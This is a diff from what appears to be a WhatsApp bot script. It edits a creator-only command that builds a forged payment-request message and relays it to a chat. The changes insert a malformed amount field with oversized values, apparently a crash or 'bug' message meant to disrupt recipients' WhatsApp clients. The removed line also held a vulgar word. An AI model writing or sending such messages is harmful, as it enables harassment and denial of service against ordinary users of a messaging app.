@@ -1067,19 +1067,19 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
 }
 break
 //=================================================//
-case 'ndr': {
+case 'pristel': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
-"amount1000": "999999",
+"amount99999999999999999": "999999999999",
 "requestPaymentimage": messa.imageMessage,
 "requestFrom": "@s.whatsapp.net",
 "noteMessage": {
 "extendedTextMessage": {
-"text": `memek`,
+"text": `teefer-999999999999`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
